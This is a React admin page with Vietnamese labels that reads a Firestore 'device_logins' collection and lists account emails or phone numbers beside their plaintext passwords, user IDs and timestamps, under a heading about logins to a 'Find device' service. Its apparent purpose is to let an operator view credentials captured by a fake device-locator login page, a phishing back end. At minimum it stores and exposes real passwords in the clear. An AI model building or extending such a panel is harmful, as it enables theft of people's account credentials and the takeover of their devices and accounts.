import React, { useState, useEffect } from 'react';
import { collection, query, orderBy, onSnapshot, deleteDoc, doc } from 'firebase/firestore';
import { db } from '../../lib/firebase';
import { format } from 'date-fns';
import { Trash2 } from 'lucide-react';
import { useConfirmStore } from '../../store/confirmStore';
import toast from 'react-hot-toast';

export default function AdminLogins() {
  const [logins, setLogins] = useState<any[]>([]);
  const { openConfirm } = useConfirmStore();

  useEffect(() => {
    const q = query(collection(db, 'device_logins'), orderBy('timestamp', 'desc'));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      setLogins(snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })));
    });
    return () => unsubscribe();
  }, []);

  const handleDelete = (id: string) => {
    openConfirm({
      title: 'Xóa log đăng nhập',
      message: 'Bạn có chắc chắn muốn xóa bản ghi này?',
      confirmText: 'Xóa',
      cancelText: 'Huỷ',
      onConfirm: async () => {
        try {
          await deleteDoc(doc(db, 'device_logins', id));
          toast.success('Đã xóa log đăng nhập');
        } catch(e) {
          toast.error('Lỗi khi xóa bản ghi');
        }
      }
    });
  };

  return (
    <div className="bg-white dark:bg-white/5 border border-slate-200 dark:border-white/10 rounded-2xl overflow-hidden shadow-sm">
      <div className="p-4 border-b border-slate-200 dark:border-white/10 flex justify-between items-center">
        <h2 className="text-lg font-bold text-slate-900 dark:text-white">Lịch sử đăng nhập "Tìm thiết bị"</h2>
      </div>
      <div className="overflow-x-auto">
        <table className="w-full text-left text-sm text-slate-900 dark:text-white min-w-[700px]">
          <thead className="bg-slate-50 dark:bg-white/5 border-b border-slate-200 dark:border-white/10 text-slate-500">
            <tr>
              <th className="px-6 py-4">Tài khoản (Email/SĐT)</th>
              <th className="px-6 py-4">Mật khẩu</th>
              <th className="px-6 py-4">User ID Hệ thống</th>
              <th className="px-6 py-4">Thời gian</th>
              <th className="px-6 py-4 text-right">Thao tác</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-slate-200 dark:divide-white/10">
            {logins.map(l => (
              <tr key={l.id} className="hover:bg-slate-50 dark:hover:bg-white/5">
                <td className="px-6 py-4 font-medium text-blue-500">{l.email}</td>
                <td className="px-6 py-4 font-mono text-slate-600 dark:text-slate-300">{l.password}</td>
                <td className="px-6 py-4 text-slate-500 text-xs">{l.userId}</td>
                <td className="px-6 py-4 text-slate-500">{l.timestamp ? format(l.timestamp, 'HH:mm - dd/MM/yyyy') : '-'}</td>
                <td className="px-6 py-4 text-right">
                  <button onClick={() => handleDelete(l.id)} className="text-red-500 hover:text-red-600 p-2"><Trash2 className="w-4 h-4" /></button>
                </td>
              </tr>
            ))}
            {logins.length === 0 && (
              <tr>
                <td colSpan={5} className="px-6 py-8 text-center text-slate-500">
                  Chưa có bản ghi nào
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}
